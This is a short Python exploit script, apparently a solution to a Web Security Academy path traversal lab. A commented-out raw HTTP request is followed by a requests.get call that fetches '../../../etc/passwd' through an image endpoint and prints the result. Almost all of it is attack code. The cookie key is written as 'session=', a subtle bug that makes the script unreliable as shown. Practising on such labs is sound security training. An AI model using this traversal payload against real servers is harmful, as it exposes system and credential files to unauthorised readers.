# GET /image?filename=../../../etc/passwd HTTP/2
# Host: 0acd00ba031f53b18291892d007900ab.web-security-academy.net
# Cookie: session=qPgKpOYGKBeRiZSgPYU0tCIojM9Htu2k
# Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
# Sec-Ch-Ua-Mobile: ?0
# Sec-Ch-Ua-Platform: "Linux"
# Accept-Language: en-US,en;q=0.9
# Upgrade-Insecure-Requests: 1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Sec-Fetch-Site: none
# Sec-Fetch-Mode: navigate
# Sec-Fetch-User: ?1
# Sec-Fetch-Dest: document
# Accept-Encoding: gzip, deflate, br
# Priority: u=0, i

import requests

url = "https://0acd00ba031f53b18291892d007900ab.web-security-academy.net/image?filename=../../../etc/passwd"
r = requests.get(url, cookies={"session=": "qPgKpOYGKBeRiZSgPYU0tCIojM9Htu2k"})
print(r.text)
